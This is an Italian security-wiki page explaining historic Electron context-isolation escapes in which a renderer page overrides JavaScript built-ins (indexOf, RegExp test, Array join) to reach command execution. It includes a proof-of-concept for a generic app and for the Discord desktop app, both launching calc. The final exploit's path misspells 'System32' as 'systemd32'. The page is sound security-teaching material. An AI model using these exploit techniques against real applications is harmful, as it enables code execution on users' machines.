# Electron contextIsolation RCE tramite codice preload

{{#include ../../banners/hacktricks-training.md}}

Queste sono **catene storiche** in cui il codice preload condivideva intrinseci JavaScript o API privilegiate con contenuti renderer controllati dall'attaccante. Con context isolation abilitato, preload e pagina hanno normalmente realm JavaScript separati, quindi le modifiche ai prototype nella pagina non influiscono automaticamente sugli oggetti preload. Verificate la catena rispetto alla versione esatta di Electron/applicazione e all'implementazione del bridge.<sup>[[3]](#references)</sup>

## Esempio 1

Esempio tratto da [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Questo codice apre i link http(s) con il browser predefinito:

![Electron contextIsolation RCE tramite codice preload - Esempio 1: Questo codice apre i link http(s) con il browser predefinito](<../../images/image (768).png>)

Nell'applicazione storica vulnerabile, una navigazione a un file locale come `file:///C:/Windows/System32/calc.exe` poteva raggiungere un percorso di avvio del sistema operativo; `SAFE_PROTOCOLS.indexOf` avrebbe dovuto impedirlo.

Di conseguenza, un attaccante poteva iniettare questo codice JS tramite XSS o navigazione arbitraria della pagina:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Poiché la chiamata a `SAFE_PROTOCOLS.indexOf` restituirà sempre 1337, l'attaccante può aggirare la protezione ed eseguire calc. Exploit finale:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Controlla le slide originali per individuare altri modi per eseguire programmi senza che venga chiesto il permesso.<sup>[[1]](#references)</sup>

Nella storica conversazione su Discord è stato inoltre considerato il caricamento tramite `file://127.0.0.1/electron/rce.jar` in stile UNC come un altro possibile percorso di esecuzione; verifica che sia raggiungibile sulla specifica build di Windows/Electron.<sup>[[2]](#references)</sup>

## Esempio 2: RCE nell'app Discord

Esempio tratto da [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Controllando gli script preload, ho scoperto che Discord espone alla pagina web la funzione che permette di chiamare alcuni moduli consentiti tramite `DiscordNative.nativeModules.requireModule('MODULE-NAME')`.\
In questo caso, non potevo usare moduli direttamente sfruttabili per ottenere RCE, come il modulo _child_process_, ma **ho trovato un codice che permette di ottenere RCE sovrascrivendo i metodi built-in di JavaScript** e interferendo con l'esecuzione del modulo esposto.

Di seguito il PoC. Sono riuscito a confermare che l'applicazione **calc** si **apre** quando inv**oco la funzione `getGPUDriverVersions`**, definita nel modulo chiamato "_discord_utils_", da devTools, e **sovrascrivo `RegExp.prototype.test` e `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

La funzione `getGPUDriverVersions` tenta di eseguire il programma utilizzando la libreria "_execa_", come segue:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Di solito _execa_ prova a eseguire "_nvidia-smi.exe_", specificato nella variabile `nvidiaSmiPath`; tuttavia, a causa di `RegExp.prototype.test` e `Array.prototype.join` sovrascritti, **l'argomento viene sostituito con "**_**calc**_** durante l'elaborazione interna di _execa**_**.

Nello specifico, l'argomento viene sostituito influenzando i percorsi di risoluzione dei comandi e di elaborazione degli argomenti nel parser storico di `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: sfruttare la mancanza di isolamento del contesto - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE nell'app desktop di Discord](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Isolamento del contesto](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [Revisione del parser `node-cross-spawn` e percorsi esatti usati dalla catena (righe 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
